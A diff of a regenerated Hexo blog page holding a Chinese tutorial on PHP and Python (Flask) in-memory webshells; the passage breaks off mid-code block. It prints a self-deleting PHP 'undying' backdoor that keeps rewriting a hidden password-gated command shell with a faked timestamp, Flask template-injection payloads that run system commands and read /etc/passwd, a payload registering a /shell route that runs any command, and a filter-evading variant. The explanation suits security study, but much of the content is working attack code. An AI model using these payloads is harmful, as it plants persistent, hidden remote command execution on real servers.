@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 5.3.0">
+<meta name="generator" content="Hexo 8.1.1">
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/images/Pooka.ico">
   <link rel="icon" type="image/png" sizes="16x16" href="/images/Pooka.ico">
@@ -39,7 +39,7 @@
 <meta property="og:image" content="http://img.npfs06.top/20210929235842.png">
 <meta property="og:image" content="http://img.npfs06.top/20210930084309.png">
 <meta property="og:image" content="http://img.npfs06.top/20210930084409.png">
-<meta property="og:image" content="https://npfs06.top/2021/09/30/%E6%B5%85%E6%9E%90php-python%E5%86%85%E5%AD%98%E9%A9%AC/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20210930084519831.png">
+<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20210930084519831.png">
 <meta property="og:image" content="http://img.npfs06.top/20210930084757.png">
 <meta property="og:image" content="http://img.npfs06.top/20210929235746.png">
 <meta property="og:image" content="http://img.npfs06.top/20210930000504.png">
@@ -267,15 +267,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>浅析php&amp;python内存马<a id="more"></a></p>
+        <p>浅析php&amp;python内存马<span id="more"></span></p>
 <h1 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h1><p>webshell的变迁过程大致如下所述：</p>
 <p>web服务器管理页面——&gt; 大马——&gt;小马拉大马——&gt;一句话木马——&gt;加密一句话木马——&gt;加密内存马</p>
-<img src="http://img.npfs06.top/20210927000700.png" style="zoom:80%;">
+<img src="http://img.npfs06.top/20210927000700.png" style="zoom:80%;" />
 
 
 
 <p>传统Webshell连接方式，都是先通过某种漏洞将恶意的脚本木马文件上传，然后通过中国菜刀，或者蚁剑，冰蝎等Webshell管理软件进行链接。</p>
-<img src="http://img.npfs06.top/20210929204425.png" style="zoom:80%;">
+<img src="http://img.npfs06.top/20210929204425.png" style="zoom:80%;" />
 
 
 
@@ -283,13 +283,14 @@
 <pre><code>    内存 webshell 相比于常规 webshell 更容易躲避传统安全监测设备的检测，**Webshell内存马是无文件马，利用中间件的进程执行某些恶意代码，不会有文件落地**。其通常被用来做持久化，规避检测，持续驻留目标服务器。无文件攻击、内存 Webshell、进程注入等基于内存的攻击手段也受到了大多数攻击者青睐。
 </code></pre>
 <h1 id="webshell内存马使用"><a href="#webshell内存马使用" class="headerlink" title="webshell内存马使用"></a>webshell内存马使用</h1><p>新版本的冰蝎，可以直接进行注入内存马</p>
-<img src="http://img.npfs06.top/20210927001824.png" style="zoom:80%;">
+<img src="http://img.npfs06.top/20210927001824.png" style="zoom:80%;" />
 
 
 
 <h1 id="PHP-内存马"><a href="#PHP-内存马" class="headerlink" title="PHP 内存马"></a>PHP 内存马</h1><p>PHP内存马想必大家都不陌生，是线下AWD中常用手段之一。在蚁剑中也有专门的插件可以一键注入内存马</p>
 <p>php 内存马也就是 php 不死马，它的原理是将一个木马反复写入，在内存中执行死循环，使管理员无法删除木马文件</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line">	set_time_limit(<span class="number">0</span>);</span><br><span class="line">	unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line">	<span class="variable">$file</span> = <span class="string">&#x27;/var/www/dvwa/.ski12.php&#x27;</span>;</span><br><span class="line">	<span class="variable">$code</span> = <span class="string">&#x27;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;cdd7b7420654eb16c1e1b748d5b7c5b8&quot;)&#123;@system($_POST[a]);&#125;?&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		file_put_contents(<span class="variable">$file</span>, <span class="variable">$code</span>);</span><br><span class="line">		system(<span class="string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .ski12.php&#x27;</span>);</span><br><span class="line">		usleep(<span class="number">5000</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line">	<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">	<span class="variable">$file</span> = <span class="string">&#x27;/var/www/dvwa/.ski12.php&#x27;</span>;</span><br><span class="line">	<span class="variable">$code</span> = <span class="string">&#x27;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;cdd7b7420654eb16c1e1b748d5b7c5b8&quot;)&#123;@system($_POST[a]);&#125;?&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$code</span>);</span><br><span class="line">		<span class="title function_ invoke__">system</span>(<span class="string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .ski12.php&#x27;</span>);</span><br><span class="line">		<span class="title function_ invoke__">usleep</span>(<span class="number">5000</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
 <ul>
 <li>ignore_user_abort()函数设置与客户机断开是否会终止脚本的执行。这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行。</li>
 <li>set_time_limit()函数设置脚本最大执行时间。这里设置为0，即没有时间方面的限制。</li>
@@ -308,7 +309,8 @@
 </blockquote>
 <p>在JAVA内存马中，实现最简单的内存马在于tomcat的路由机制filter。而我们想在python中实现内存马，首先需要考虑的是flask 是否能动态注册路由。</p>
 <p>flask 常规注册的方式为使用装饰器 <code>@app.route()</code> 。而实际工作的函数为装饰器里调用的方法 <code>self.add_url_rule()</code> </p>
-<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.add<span class="constructor">_url_rule(&#x27;<span class="operator">/</span><span class="params">index</span><span class="operator">/</span>&#x27;,<span class="params">endpoint</span>=&#x27;<span class="params">index</span>&#x27;,<span class="params">view_func</span>=<span class="params">index</span>)</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.add_url_rule(<span class="string">&#x27;/index/&#x27;</span>,<span class="attribute">endpoint</span>=<span class="string">&#x27;index&#x27;</span>,view_func=index)</span><br></pre></td></tr></table></figure>
+
 <p>self.add_url_rule的三个参数：</p>
 <ol>
 <li>url<br>与app.route()的第一个参数一样。必须以<code>/</code>开始</li>
@@ -320,67 +322,76 @@
 <figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当一个网页请求进入 Flask，会实例化一个Request Context。在python中分出了两种上下文，请求上下文(request <span class="built_in">context</span>)和应用上下文(session <span class="built_in">context</span>)。一个请求上下文中封装了请求的信息。而上下文的结构是运用了一个Stack的栈结构，也就是说它拥有一个栈所拥有的全部特性。request <span class="built_in">context</span>实例化后，它会被<span class="built_in">push</span>到栈_request_ctx_stack中，那我们可以通过获取栈顶元素的方法来获取当前的请求。</span><br></pre></td></tr></table></figure>
 
 
-<h2 id="构造webshell"><a href="#构造webshell" class="headerlink" title="构造webshell"></a>构造webshell</h2><p>Flask使用Jinja2渲染引擎，以<code>&#123;&#123;&#125;&#125;`作为变量包裹的标识符同时，这个符号包裹内还可以执行一些简单的表达式 ,模板引擎会对输入变量进行编码转义
 
-**对象的魔术方法：**
-
+<h2 id="构造webshell"><a href="#构造webshell" class="headerlink" title="构造webshell"></a>构造webshell</h2><p>Flask使用Jinja2渲染引擎，以<code>&#123;&#123;&#125;&#125;</code>作为变量包裹的标识符同时，这个符号包裹内还可以执行一些简单的表达式 ,模板引擎会对输入变量进行编码转义</p>
+<p><strong>对象的魔术方法：</strong></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__class__  返回类型所属的对象</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   返回该对象所继承的基类</span><br><span class="line">// __base__和__mro__都是用来寻找基类的</span><br><span class="line"></span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure>
 
 
-虽然通过 `&#123;&#123;...&#125;&#125;</code> 执行表达式，但是命名空间是受限的，没有 <code>builtins</code>，所以 <code>eval</code>、<code>popen</code> 这些函数是不能使用的。但是我们可以通过任意一个函数的 <code>func_globals</code> 从而得到其命名空间，进而得到 <code>builtins</code>。</p>
+
+<p>虽然通过 <code>&#123;&#123;...&#125;&#125;</code> 执行表达式，但是命名空间是受限的，没有 <code>builtins</code>，所以 <code>eval</code>、<code>popen</code> 这些函数是不能使用的。但是我们可以通过任意一个函数的 <code>func_globals</code> 从而得到其命名空间，进而得到 <code>builtins</code>。</p>
 <h3 id="builtins-函数科普"><a href="#builtins-函数科普" class="headerlink" title="__builtins__ 函数科普"></a>__builtins__ 函数科普</h3><p>这里简单介绍下python的内置函数_<em>builtins_\</em> 。通过dir(__builtins__)可以查看内置函数，展示所有内置类型和函数。</p>
-<img src="http://img.npfs06.top/20210930001322.png" style="zoom:80%;">
+<img src="http://img.npfs06.top/20210930001322.png" style="zoom:80%;" />
 
 <p>我们先来看最基础的__import__函数</p>
 <p># 直接调用</p>
-<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">__builtins__</span><span class="selector-class">.__import__</span>(<span class="string">&#x27;os&#x27;</span>)<span class="selector-class">.system</span>(<span class="string">&#x27;dir&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<img src="http://img.npfs06.top/20210930001355.png" style="zoom:80%;">
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">__builtins__</span>.<span class="variable">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;dir&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<img src="http://img.npfs06.top/20210930001355.png" style="zoom:80%;" />
 
 <p># 通过dict访问</p>
-<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">__builtins__</span>.</span><span class="module"><span class="identifier">__dict__</span>[</span></span>‘import<span class="constructor">__(&#x27;<span class="params">os</span>&#x27;)</span>’].system(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure>
-<img src="http://img.npfs06.top/20210930001417.png" style="zoom:80%;">
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">__builtins__</span>.<span class="variable">__dict__</span>[‘import__(<span class="string">&#x27;os&#x27;</span>)’].system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<img src="http://img.npfs06.top/20210930001417.png" style="zoom:80%;" />
 
 <p> 玩一些花样-转码</p>
-<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">__builtins__</span><span class="selector-class">.__dict__</span><span class="selector-attr">[<span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)]</span>(<span class="string">&#x27;b3M=&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>))<span class="selector-class">.system</span>(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<img src="http://img.npfs06.top/20210930001449.png" style="zoom:80%;">
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[<span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)](<span class="string">&#x27;b3M=&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)).<span class="keyword">system</span>(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<img src="http://img.npfs06.top/20210930001449.png" style="zoom:80%;" />
 
 <p>此外还有file、open、eval等函数</p>
 <figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">__builtins__</span>.<span class="variable">__dict__</span>.<span class="variable">__getitem__</span>(<span class="string">&#x27;file&#x27;</span>)(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"><span class="variable">__builtins__</span>.<span class="variable">__dict__</span>.<span class="variable">__getitem__</span>(<span class="string">&#x27;open&#x27;</span>)(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"><span class="variable">__builtins__</span>.<span class="variable">__dict__</span>.<span class="variable">__getitem__</span>(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure>
+
 <p># import 其他模块</p>
 <figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">__builtins__</span>.<span class="variable">__import__</span>(<span class="string">&#x27;commands&#x27;</span>).getoutput(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line"><span class="variable">__builtins__</span>.<span class="variable">__import__</span>(<span class="string">&#x27;commands&#x27;</span>).getstatusoutput(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line"><span class="variable">__builtins__</span>.<span class="variable">__import__</span>(<span class="string">&#x27;subprocess&#x27;</span>).<span class="built_in">call</span>([<span class="string">&#x27;id&#x27;</span>],shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
-<img src="http://img.npfs06.top/20210930001545.png" style="zoom:80%;">
+
+<img src="http://img.npfs06.top/20210930001545.png" style="zoom:80%;" />
 
 <p>关于import还有其他一些有意思的操作，包括reload方法、设置sys.modules[‘os’]、execfile等。</p>
 <p><strong>回到正题，Flask 内置了两个函数 <code>url_for</code> 和 <code>get_flashed_messages</code>。也就是构造命令执行可以使用：</strong></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 
-<h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;center-content error&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Oops! That page doesn&#x27;t exist.&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;%s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span> %(request.values.get(<span class="string">&#x27;param&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(port=<span class="number">8000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;center-content error&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Oops! That page doesn&#x27;t exist.&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;%s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span> %(request.values.get(<span class="string">&#x27;param&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(port=<span class="number">8000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 
-<img src="http://img.npfs06.top/20210929235842.png" style="zoom:80%;">
+
+<img src="http://img.npfs06.top/20210929235842.png" style="zoom:80%;" />
 
 
 
 <p>将 payload 拆解开：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](</span><br><span class="line">	<span class="string">&quot;app.add_url_rule(</span></span><br><span class="line"><span class="string">		&#x27;/shell&#x27;, </span></span><br><span class="line"><span class="string">		&#x27;shell&#x27;, </span></span><br><span class="line"><span class="string">		lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span></span><br><span class="line"><span class="string">		)</span></span><br><span class="line"><span class="string">	&quot;</span>,</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],</span><br><span class="line">		<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">	&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
 <h3 id="payload-解析"><a href="#payload-解析" class="headerlink" title="payload 解析"></a>payload 解析</h3><p><code> url_for.globals[&#39;builtins&#39;][&#39;eval&#39;]</code></p>
 <p>这个是Flask SSTI中的payload。</p>
 <p>url_for()是Flask的一个内置函数：</p>
-<img src="http://img.npfs06.top/20210930084309.png" style="zoom:80%;">
+<img src="http://img.npfs06.top/20210930084309.png" style="zoom:80%;" />
 
 <p>通过Flask内置函数可以调用其<code>__globals__</code>属性，该特殊属性能够返回函数所在模块命名空间的所有变量，其中包含了很多已经引入的modules，这里看到是支持<code>__builtins__</code>的：</p>
-<img src="http://img.npfs06.top/20210930084409.png" style="zoom:80%;">
+<img src="http://img.npfs06.top/20210930084409.png" style="zoom:80%;" />
 
 <p><code>__builtins__</code>即是引用，Python程序一旦启动，它就会在程序员所写的代码运行之前就已经被加载到内存中了，而对于<code>__builtins__</code>却不用导入，它在任何模块都直接可见，所以可以直接调用引用的模块。其中是包含eval、exec等函数的：</p>
-<p><img src="/2021/09/30/%E6%B5%85%E6%9E%90php-python%E5%86%85%E5%AD%98%E9%A9%AC/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20210930084519831.png" alt="image-20210930084519831"></p>
+<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20210930084519831.png" alt="image-20210930084519831"></p>
 <p><strong>app.add_url_rule()函数</strong></p>
 <p>在Flask中注册路由的时候是添加的[<code>@app.route</code>装饰器来实现的。</p>
 <p>点进去看到其源码实现，其调用了add_url_rule()函数来添加路由：</p>
-<img src="http://img.npfs06.top/20210930084757.png" style="zoom:80%;">
+<img src="http://img.npfs06.top/20210930084757.png" style="zoom:80%;" />
 
 <p>add_url_rule()函数定义：</p>
-<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add<span class="constructor">_url_rule(<span class="params">rule</span>, <span class="params">endpoint</span>=None, <span class="params">view_func</span>=None, <span class="params">provide_automatic_options</span>=None, <span class="operator">**</span><span class="params">options</span>)</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add_url_rule(rule, <span class="attribute">endpoint</span>=None, <span class="attribute">view_func</span>=None, <span class="attribute">provide_automatic_options</span>=None, **options)</span><br></pre></td></tr></table></figure>
+
 <p>参数说明：</p>
 <ul>
 <li>rule：函数对应的URL规则，满足条件和app.route()的第一个参数一样，必须以<code>/</code>开头；</li>
@@ -396,12 +407,12 @@
 <p>eval() 方法的语法：</p>
 <p> <code>eval(expression[, globals[, locals]]) </code> </p>
 <p>globals - 变量作用域，全局命名空间，如果被提供，则必须是一个字典对象。指定全局变量。</p>
-<img src="http://img.npfs06.top/20210929235746.png" style="zoom:80%;">
+<img src="http://img.npfs06.top/20210929235746.png" style="zoom:80%;" />
 
 
 
 <p>使用ssti打payload后访问<code>/shell?cmd=</code>即可执行命令</p>
-<img src="http://img.npfs06.top/20210930000504.png" style="zoom:80%;">
+<img src="http://img.npfs06.top/20210930000504.png" style="zoom:80%;" />
 
 <h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>在实际操作的过程中，经常会发现某些函数或者符号被过滤了，这个时候就需要一些绕过的技巧,这有助于我们进一步的开展攻击</p>
 <ul>
@@ -417,27 +428,31 @@
 <li>……</li>
 </ul>
 <p>payload example:</p>
-<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request.application.<span class="variable">__self__</span>.<span class="variable">_get_data_for_json</span>.<span class="variable">__getattribute__</span>(<span class="string">&#x27;__globa&#x27;</span>+<span class="string">&#x27;ls__&#x27;</span>).<span class="variable">__getitem__</span>(<span class="string">&#x27;__bui&#x27;</span>+<span class="string">&#x27;ltins__&#x27;</span>).<span class="variable">__getitem__</span>(<span class="string">&#x27;ex&#x27;</span>+<span class="string">&#x27;ec&#x27;</span>)(<span class="string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;calc&#x27;)).read())&quot;</span>,&#123;<span class="string">&#x27;_request_ct&#x27;</span>+<span class="string">&#x27;x_stack&#x27;</span>:get_flashed_messages.<span class="variable">__getattribute__</span>(<span class="string">&#x27;__globa&#x27;</span>+<span class="string">&#x27;ls__&#x27;</span>).pop(<span class="string">&#x27;_request_&#x27;</span>+<span class="string">&#x27;ctx_stack&#x27;</span>),<span class="string">&#x27;app&#x27;</span>:get_flashed_messages.<span class="variable">__getattribute__</span>(<span class="string">&#x27;__globa&#x27;</span>+<span class="string">&#x27;ls__&#x27;</span>).pop(<span class="string">&#x27;curre&#x27;</span>+<span class="string">&#x27;nt_app&#x27;</span>)&#125;)</span><br></pre></td></tr></table></figure>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request<span class="selector-class">.application</span>.__self__._get_data_for_json.<span class="built_in">__getattribute__</span>(<span class="string">&#x27;__globa&#x27;</span>+<span class="string">&#x27;ls__&#x27;</span>).<span class="built_in">__getitem__</span>(<span class="string">&#x27;__bui&#x27;</span>+<span class="string">&#x27;ltins__&#x27;</span>).<span class="built_in">__getitem__</span>(<span class="string">&#x27;ex&#x27;</span>+<span class="string">&#x27;ec&#x27;</span>)(<span class="string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;calc&#x27;)).read())&quot;</span>,&#123;<span class="string">&#x27;_request_ct&#x27;</span>+<span class="string">&#x27;x_stack&#x27;</span>:get_flashed_messages.<span class="built_in">__getattribute__</span>(<span class="string">&#x27;__globa&#x27;</span>+<span class="string">&#x27;ls__&#x27;</span>)<span class="selector-class">.pop</span>(<span class="string">&#x27;_request_&#x27;</span>+<span class="string">&#x27;ctx_stack&#x27;</span>),<span class="string">&#x27;app&#x27;</span>:get_flashed_messages.<span class="built_in">__getattribute__</span>(<span class="string">&#x27;__globa&#x27;</span>+<span class="string">&#x27;ls__&#x27;</span>)<span class="selector-class">.pop</span>(<span class="string">&#x27;curre&#x27;</span>+<span class="string">&#x27;nt_app&#x27;</span>)&#125;)</span><br></pre></td></tr></table></figure>
+
 
 
 <p>flask 还有一个有趣的特性就是</p>
 <p><strong>Flask在渲染模板的时候，有</strong></p>
-<figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.<span class="number">__</span><span class="keyword">class</span><span class="number">__</span>===<span class="string">&quot;&quot;</span>[<span class="string">&quot;__class__&quot;</span>]</span><br></pre></td></tr></table></figure>
